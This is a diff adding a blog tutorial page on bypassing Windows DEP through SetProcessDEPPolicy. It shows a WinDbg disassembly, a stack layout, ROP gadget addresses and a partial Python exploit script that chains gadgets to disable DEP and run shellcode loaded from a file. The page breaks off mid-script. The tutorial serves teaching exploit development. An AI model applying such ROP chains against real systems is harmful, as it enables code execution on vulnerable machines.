@@ -1,0 +1,292 @@
+<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[Learning] Bypassing DEP: SetProcessDEPPolicy | ISSAC/iss4cf0ng's blog</title><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="[Learning] Bypassing DEP: SetProcessDEPPolicy | ISSAC/iss4cf0ng's blog"><meta name="twitter:image" content="https://iss4cf0ng.github.io/images/meme/Wallpaper/MyArt/14.png"><meta property="og:title" content="[Learning] Bypassing DEP: SetProcessDEPPolicy"><meta property="og:image" content="https://iss4cf0ng.github.io/images/meme/Wallpaper/MyArt/14.png"><meta property="og:url" content="https://iss4cf0ng.github.io/2026/09/27/2026-9-28-DEP/index.html"><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><script async src="https://www.googletagmanager.com/gtag/js?id=G-RQ7HTMYT8W"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-RQ7HTMYT8W');</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/Arsenal/"><span class="navItemTitle">Arsenal</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li><li class="navItem"><a class="navBlock" href="/Series/"><span class="navItemTitle">Series</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[Learning] Bypassing DEP: SetProcessDEPPolicy</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-09-27T07:45:41.000Z" id="date"> 2026-09-27</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-09-29T13:51:59.101Z" id="updated"> 2026-09-29</time></div></span><br><span>Word Count: <div class="control">1.8k</div></span><br><span>Read Time: <div class="control">10 min</div></span></div></div><hr><div id="post-content"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is part of my series: <strong><a href="/FromBugToExploit">From Bug To Exploit</a></strong>.</p>
+<p>In <a href="/2026/09/27/2026-9-27-DEP/">the previous article</a>, I mentioned six common methods to bypass DEP:</p>
+<ol>
+<li><code>ZwSetInformationProcess</code></li>
+<li><code>SetProcessDEPPolicy</code></li>
+<li><code>VirtualProtect</code></li>
+<li><code>WriteProcessMemory</code></li>
+<li><code>VirtualAlloc &amp; memcpy</code></li>
+<li><code>HeapCreate &amp; HeapAlloc &amp; memcpy</code></li>
+</ol>
+<p>In this article, I will introduce the second method: using the <code>SetProcessDEPPolicy</code> API.</p>
+<h1 id="SetProcessDEPPolicy"><a href="#SetProcessDEPPolicy" class="headerlink" title="SetProcessDEPPolicy"></a>SetProcessDEPPolicy</h1><p>According to the <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setprocessdeppolicy">MSDN documentation</a>, a process can disable DEP by passing <code>0</code> as the <code>dwFlags</code> parameter.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">SetProcessDEPPolicy</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [in] DWORD dwFlags</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure>
+<p>Since it only has a single parameter, we can apply the technique from <a href="/2026/09/27/2026-9-27-DEP/">the previous article</a>.</p>
+<h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><p>First, we can disassemble the <code>SetProcessDEPPolicy</code> API with WinDbg. The result is shown below:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-28-DEP/1.png'><img src="/images/article/2026-9-28-DEP/1.png" width=800/>
+</p>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; uf setprocessdeppolicy<br>*** ERROR: Module load completed but symbols could not be loaded for image00400000<br>kernel32!SetProcessDEPPolicy:<br>7c863114 8bff            mov     edi,edi<br>7c863116 55              push    ebp<br>7c863117 8bec            mov     ebp,esp<br>7c863119 8b4508          mov     eax,dword ptr [ebp+8]<br>7c86311c a9fcffffff      test    eax,0FFFFFFFCh<br>7c863121 7407            je      kernel32!SetProcessDEPPolicy+0x16 (7c86312a)<br><br>kernel32!SetProcessDEPPolicy+0xf:<br>7c863123 680d0000c0      push    0C000000Dh<br>7c863128 eb3e            jmp     kernel32!SetProcessDEPPolicy+0x54 (7c863168)<br><br>kernel32!SetProcessDEPPolicy+0x16:<br>7c86312a a801            test    al,1<br>7c86312c 7414            je      kernel32!SetProcessDEPPolicy+0x2e (7c863142)<br><br>kernel32!SetProcessDEPPolicy+0x1a:<br>7c86312e a802            test    al,2<br>7c863130 c7450809000000  mov     dword ptr [ebp+8],9<br>7c863137 741a            je      kernel32!SetProcessDEPPolicy+0x3f (7c863153)<br><br>kernel32!SetProcessDEPPolicy+0x25:<br>7c863139 c745080d000000  mov     dword ptr [ebp+8],0Dh<br>7c863140 eb11            jmp     kernel32!SetProcessDEPPolicy+0x3f (7c863153)<br><br>kernel32!SetProcessDEPPolicy+0x2e:<br>7c863142 6a02            push    2<br>7c863144 59              pop     ecx<br>7c863145 84c1            test    cl,al<br>7c863147 7407            je      kernel32!SetProcessDEPPolicy+0x3c (7c863150)<br><br>kernel32!SetProcessDEPPolicy+0x35:<br>7c863149 68300000c0      push    0C0000030h<br>7c86314e eb18            jmp     kernel32!SetProcessDEPPolicy+0x54 (7c863168)<br><br>kernel32!SetProcessDEPPolicy+0x3c:<br>7c863150 894d08          mov     dword ptr [ebp+8],ecx<br><br>kernel32!SetProcessDEPPolicy+0x3f:<br>7c863153 6a04            push    4<br>7c863155 8d4508          lea     eax,[ebp+8]<br>7c863158 50              push    eax<br>7c863159 6a22            push    22h<br>7c86315b 6aff            push    0FFFFFFFFh<br>7c86315d ff152812807c    call    dword ptr [kernel32!_imp__NtSetInformationProcess (7c801228)]<br>7c863163 85c0            test    eax,eax<br>7c863165 7d0a            jge     kernel32!SetProcessDEPPolicy+0x5d (7c863171)<br><br>kernel32!SetProcessDEPPolicy+0x53:<br>7c863167 50              push    eax<br><br>kernel32!SetProcessDEPPolicy+0x54:<br>7c863168 e8cc63faff      call    kernel32!BaseSetLastNTError (7c809539)<br>7c86316d 33c0            xor     eax,eax<br>7c86316f eb03            jmp     kernel32!SetProcessDEPPolicy+0x60 (7c863174)<br><br>kernel32!SetProcessDEPPolicy+0x5d:<br>7c863171 33c0            xor     eax,eax<br>7c863173 40              inc     eax<br><br>kernel32!SetProcessDEPPolicy+0x60:<br>7c863174 5d              pop     ebp<br>7c863175 c20400          ret     4<br></code></pre></td></tr></table></figure>
+<p>In my environment, the function is located at <code>7c863114</code> and ends with <code>ret 4</code>.</p>
+<p>Similar to <a href="/2026/09/27/2026-9-27-DEP/">the previous article</a>, we call the API directly. Therefore, we can arrange the exploit buffer as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">edi-0x30    : padding A<br>edi-0x10    : SetProcessDEPPolicy<br>edi-0x0c    : padding B<br>edi-0x04    : jmp esp<br>edi         : padding C, parameters of SetProcessDEPPolicy<br>edi+0x04    : Shellcode A<br>edi+0x09    : padding D, used for leading a buffer overflow<br>edi+0x5c    : rop, overwriting EIP<br>edi+...     : Shellcode B<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>Note: There is no standard answer for a ROP exploit chain.</p>
+</blockquote>
+<p>Run the command below in Immunity Debugger to find all available gadgets:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">!mona rop -m *<br></code></pre></td></tr></table></figure>
+<h1 id="Writing-ROP-Exploit-Script"><a href="#Writing-ROP-Exploit-Script" class="headerlink" title="Writing ROP Exploit Script"></a>Writing ROP Exploit Script</h1><p>We need to overwrite <code>EIP</code> with the first gadget of our ROP chain.</p>
+<p>Let’s get started with <code>rop1</code>. We use <code>EDI</code> as a “pivot”, so we need to initialize it:</p>
+<ol>
+<li><code>0x7eb9a880</code>: <code># PUSH ESP # ADD BH,BH # DEC ECX # POP EAX # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;</code></li>
+<li><code>0x7eb5de9d</code>: <code>SUB EAX,30 # POP EBP # RETN</code></li>
+<li><code>0x7eb5de9d</code>: <code>SUB EAX,30 # POP EBP # RETN</code></li>
+<li><code>0x7eb5b0e7</code>: <code>PUSH EAX # ADD AL,66 # MOV DWORD PTR DS:[EAX],1B00001 # POP EDI # POP ESI # POP EBP # RETN 0x08</code></li>
+</ol>
+<p>We set the pivot <code>EDI</code> to an address that is <code>60</code> bytes away from <code>ESP</code>.</p>
+<p>Next, we set the parameter in <code>rop2</code>. We need to put <code>0</code> in <code>[EDI]</code>:</p>
+<ol>
+<li><code>0x7eb4dafd</code>: <code># XOR ECX,ECX # RETN    ** [ntdll.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;</code></li>
+<li><code>0x77c34dc2</code>: <code># MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;</code></li>
+<li><code>0x7eb82f36</code>: <code># MOV DWORD PTR DS:[EAX],ECX # RETN    ** [ntdll.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;</code></li>
+</ol>
+<p>In <code>rop3</code>, we need to set <code>ESP</code> to <code>[EDI-4]</code>, causing it to call the API.</p>
+<ol>
+<li><code>0x77c3dbba</code>: <code># MOV EAX,EDI # POP EDI # RETN    ** [msvcrt.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;</code></li>
+<li><code>0x77c47844</code>: <code># ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;</code></li>
+<li><code>0x77c47844</code>: <code># ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;</code></li>
+<li><code>0x77c47844</code>: <code># ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;</code></li>
+<li><code>0x77c47844</code>: <code># ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;</code></li>
+<li><code>0x77c47844</code>: <code># ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;</code></li>
+<li><code>0x77c47844</code>: <code># ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;</code></li>
+<li><code>0x77c47844</code>: <code># ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;</code></li>
+<li><code>0x77c47844</code>: <code># ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;</code></li>
+<li><code>0x7eb9a9e3</code>: <code># PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08    ** [ntdll.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;</code></li>
+</ol>
+<p>Therefore, the completed ROP exploit script can be implemented as follows:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># exploit.py</span><br><br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p32</span>(<span class="hljs-params">addr: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, addr)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_shellcode</span>() -&gt; <span class="hljs-built_in">bytes</span>:<br>    shellcode = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;messagebox.bin&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        shellcode = f.read()<br><br>    <span class="hljs-keyword">return</span> shellcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sword_two</span>() -&gt; <span class="hljs-built_in">bytes</span>:<br>    offset = <span class="hljs-number">140</span><br><br>    api = p32(<span class="hljs-number">0x7c863114</span>) <span class="hljs-comment"># SetProcessDEPPolicy</span><br>    stack_pivot = p32(<span class="hljs-number">0x7c874f13</span>)<br><br>    shellcode_A = <span class="hljs-string">b&#x27;\x89\xe0\x83\xc0\x7f\x83\xc0\x7f\x83\xc0\x7f\x83\xc0\x5f\xff\xe0&#x27;</span><br>    shellcode_B = read_shellcode()<br><br>    rop1 = <span class="hljs-string">b&#x27;&#x27;</span><br>    rop1 += p32(<span class="hljs-number">0x7eb9a880</span>) <span class="hljs-comment"># PUSH ESP # ADD BH,BH # DEC ECX # POP EAX # POP EBP # RETN 0x04</span><br>    rop1 += <span class="hljs-string">b&#x27;1111&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop1 += p32(<span class="hljs-number">0x7eb5de9d</span>) <span class="hljs-comment"># SUB EAX,30 # POP EBP # RETN</span><br>    rop1 += <span class="hljs-string">b&#x27;1111&#x27;</span> <span class="hljs-comment"># retn 0x04</span><br>    rop1 += <span class="hljs-string">b&#x27;1111&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop1 += p32(<span class="hljs-number">0x7eb5de9d</span>) <span class="hljs-comment"># SUB EAX,30 # POP EBP # RETN</span><br>    rop1 += <span class="hljs-string">b&#x27;1111&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop1 += p32(<span class="hljs-number">0x7eb5b0e7</span>) <span class="hljs-comment"># PUSH EAX # ADD AL,66 # MOV DWORD PTR DS:[EAX],1B00001 # POP EDI # POP ESI # POP EBP # RETN 0x08</span><br>    rop1 += <span class="hljs-string">b&#x27;1111&#x27;</span> <span class="hljs-comment"># pop esi</span><br>    rop1 += <span class="hljs-string">b&#x27;1111&#x27;</span> <span class="hljs-comment"># pop esi</span><br><br>    rop2 = <span class="hljs-string">b&#x27;&#x27;</span><br>    rop2 += p32(<span class="hljs-number">0x7eb4dafd</span>) <span class="hljs-comment"># XOR ECX,ECX # RETN</span><br>    rop2 += <span class="hljs-string">b&#x27;22222222&#x27;</span> <span class="hljs-comment"># retn 0x08 from rop1</span><br>    rop2 += p32(<span class="hljs-number">0x77c34dc2</span>) <span class="hljs-comment"># MOV EAX,EDI # POP EDI # RETN</span><br>    rop2 += <span class="hljs-string">b&#x27;2222&#x27;</span> <span class="hljs-comment"># pop edi</span><br>    rop2 += p32(<span class="hljs-number">0x7eb82f36</span>) <span class="hljs-comment"># MOV DWORD PTR DS:[EAX],ECX # RETN</span><br><br>    rop3 = <span class="hljs-string">b&#x27;&#x27;</span><br>    rop3 += p32(<span class="hljs-number">0x77c34dc2</span>) <span class="hljs-comment"># MOV EAX,EDI # POP ESI # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop edi</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x77c47844</span>) <span class="hljs-comment"># ADD EAX,-2 # POP EBP # RETN</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    rop3 += p32(<span class="hljs-number">0x7eb9a9e3</span>) <span class="hljs-comment"># PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08</span><br>    rop3 += <span class="hljs-string">b&#x27;3333&#x27;</span> <span class="hljs-comment"># pop ebp</span><br>    <span class="hljs-comment"># left 0x08 bytes for retn 0x08</span><br><br>    padding_A = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">4</span> <span class="hljs-comment"># junk</span><br>    padding_B = <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span> <span class="hljs-comment"># retn 0x08 from rop3</span><br>    padding_C = <span class="hljs-string">b&#x27;C&#x27;</span> * <span class="hljs-number">4</span> <span class="hljs-comment"># retn 0x04 from 